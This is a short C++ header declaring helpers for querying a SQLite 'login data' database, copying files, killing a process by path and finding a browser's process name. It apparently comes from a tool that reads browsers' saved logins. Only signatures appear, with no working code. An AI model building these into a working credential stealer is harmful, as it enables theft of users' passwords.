#ifndef HELPER_H
#define HELPER_H

#include "includes\Imports.h"

sqlite3_stmt* query_database(std::string target_login_data, const char* database_query);
BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile);
BOOL kill_process(std::string process_path);
std::string GetBrowserProcessName(const std::string& browserFolder);

#endif /* HELPER_H */#pragma once
